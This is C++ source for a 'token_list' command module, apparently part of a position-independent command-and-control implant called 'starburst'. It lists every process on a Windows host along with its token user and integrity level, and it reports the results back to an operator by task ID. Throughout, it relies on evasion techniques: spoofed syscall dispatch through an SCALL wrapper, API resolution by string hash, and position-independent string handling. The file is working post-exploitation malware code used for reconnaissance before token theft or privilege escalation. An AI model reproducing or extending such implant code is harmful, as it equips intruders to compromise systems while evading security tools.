#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <evasion/spoof_dispatch.h>

#ifdef INCLUDE_CMD_TOKEN_LIST

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_token_list(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    (void)params;

    // query process list via NtQuerySystemInformation, then enumerate tokens
    ULONG buf_size = 0x40000;
    auto buf = static_cast<uint8_t*>( inst.heap_alloc( buf_size ) );
    if ( !buf ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    NTSTATUS status = (NTSTATUS)SCALL( inst, ntdll.NtQuerySystemInformation,
        SystemProcessInformation, buf, buf_size, &buf_size );

    while ( status == STATUS_INFO_LENGTH_MISMATCH ) {
        inst.heap_free( buf );
        buf_size *= 2;
        buf = static_cast<uint8_t*>( inst.heap_alloc( buf_size ) );
        if ( !buf ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
            return;
        }
        status = (NTSTATUS)SCALL( inst, ntdll.NtQuerySystemInformation,
            SystemProcessInformation, buf, buf_size, &buf_size );
    }

    if ( status != 0 ) {
        inst.heap_free( buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "NtQuerySystemInformation failed" ) ) );
        return;
    }

    // build output: PID | User | Integrity | Process
    uint32_t out_cap = 32768;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        inst.heap_free( buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    str_copy( output, symbol<char*>( const_cast<char*>(
        "PID\tUser\tIntegrity\tProcess\n" ) ) );
    uint32_t out_offset = str_len( output );

    // resolve integrity helpers once before the loop
    typedef PUCHAR ( WINAPI *fn_GetSidSubAuthorityCount )( PSID );
    typedef PDWORD ( WINAPI *fn_GetSidSubAuthority )( PSID, DWORD );
    auto pGSSAC = reinterpret_cast<fn_GetSidSubAuthorityCount>(
        resolve::_api(
            reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
            expr::hash_string( "GetSidSubAuthorityCount" ) ) );
    auto pGSSA = reinterpret_cast<fn_GetSidSubAuthority>(
        resolve::_api(
            reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
            expr::hash_string( "GetSidSubAuthority" ) ) );

    // pre-resolve integrity label strings for PIC
    auto str_system    = symbol<char*>( const_cast<char*>( "System" ) );
    auto str_high      = symbol<char*>( const_cast<char*>( "High" ) );
    auto str_medium    = symbol<char*>( const_cast<char*>( "Medium" ) );
    auto str_low       = symbol<char*>( const_cast<char*>( "Low" ) );
    auto str_untrusted = symbol<char*>( const_cast<char*>( "Untrusted" ) );

    auto spi = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>( buf );
    while ( true ) {
        DWORD pid = (DWORD)(uintptr_t)spi->UniqueProcessId;
        if ( pid == 0 ) goto next;

        {
            HANDLE h_proc = (HANDLE)SCALL( inst, kernel32.OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid );
            HANDLE h_token = nullptr;
            char user_buf[128] = { 0 };
            uint32_t integrity = 0;

            if ( h_proc ) {
                if ( SCALL( inst, advapi32.OpenProcessToken, h_proc, TOKEN_QUERY, &h_token ) ) {
                    // get user
                    uint8_t tok_info[256] = { 0 };
                    DWORD ret_len = 0;
                    if ( SCALL( inst, advapi32.GetTokenInformation,
                            h_token, TokenUser, tok_info, sizeof(tok_info), &ret_len ) ) {
                        auto tok_user = reinterpret_cast<TOKEN_USER*>( tok_info );
                        wchar_t wname[128] = { 0 };
                        wchar_t wdom[128] = { 0 };
                        DWORD name_len = 128, dom_len = 128;
                        SID_NAME_USE snu;
                        SCALL( inst, advapi32.LookupAccountSidW,
                            nullptr, tok_user->User.Sid,
                            wname, &name_len, wdom, &dom_len, &snu );
                        // domain\user
                        SCALL( inst, kernel32.WideCharToMultiByte,
                            CP_UTF8, 0, wdom, -1, user_buf, 60, nullptr, nullptr );
                        uint32_t dlen = str_len( user_buf );
                        user_buf[dlen] = '\\';
                        SCALL( inst, kernel32.WideCharToMultiByte,
                            CP_UTF8, 0, wname, -1, user_buf + dlen + 1, 60, nullptr, nullptr );
                    }

                    // get integrity level
                    uint8_t il_buf[256] = { 0 };
                    ret_len = 0;
                    if ( SCALL( inst, advapi32.GetTokenInformation,
                            h_token, TokenIntegrityLevel, il_buf, sizeof(il_buf), &ret_len ) ) {
                        auto tml = reinterpret_cast<TOKEN_MANDATORY_LABEL*>( il_buf );
                        if ( pGSSAC && pGSSA && tml->Label.Sid ) {
                            auto count_ptr = (PUCHAR)SCALL_PTR( inst, pGSSAC, tml->Label.Sid );
                            if ( count_ptr ) {
                                auto sub_count = *count_ptr;
                                if ( sub_count > 0 ) {
                                    auto sa_ptr = (PDWORD)SCALL_PTR( inst, pGSSA, tml->Label.Sid, (DWORD)(sub_count - 1) );
                                    if ( sa_ptr ) {
                                        integrity = *sa_ptr;
                                    }
                                }
                            }
                        }
                    }

                    SCALL( inst, kernel32.CloseHandle, h_token );
                }
                SCALL( inst, kernel32.CloseHandle, h_proc );
            }

            // format line: PID\tUser\tIntegrity\tProcess
            if ( out_offset + 256 < out_cap ) {
                char num[16];
                int_to_str( num, pid, 10 );
                uint32_t nlen = str_len( num );
                memory::copy( output + out_offset, num, nlen );
                out_offset += nlen;
                output[out_offset++] = '\t';

                uint32_t ulen = str_len( user_buf );
                if ( ulen > 0 ) {
                    memory::copy( output + out_offset, user_buf, ulen );
                    out_offset += ulen;
                } else {
                    output[out_offset++] = '-';
                }
                output[out_offset++] = '\t';

                // integrity label
                char* il_label;
                if ( integrity >= 0x4000 ) il_label = str_system;
                else if ( integrity >= 0x3000 ) il_label = str_high;
                else if ( integrity >= 0x2000 ) il_label = str_medium;
                else if ( integrity >= 0x1000 ) il_label = str_low;
                else il_label = str_untrusted;
                uint32_t ilen = str_len( il_label );
                memory::copy( output + out_offset, il_label, ilen );
                out_offset += ilen;
                output[out_offset++] = '\t';

                // process name
                if ( spi->ImageName.Buffer && spi->ImageName.Length > 0 ) {
                    int plen = (int)SCALL( inst, kernel32.WideCharToMultiByte,
                        CP_UTF8, 0, spi->ImageName.Buffer, spi->ImageName.Length / 2,
                        output + out_offset, out_cap - out_offset - 4, nullptr, nullptr );
                    out_offset += plen;
                }
                output[out_offset++] = '\n';
                output[out_offset] = '\0';
            }
        }

    next:
        if ( spi->NextEntryOffset == 0 ) break;
        spi = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(
            reinterpret_cast<uint8_t*>( spi ) + spi->NextEntryOffset );
    }

    inst.heap_free( buf );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
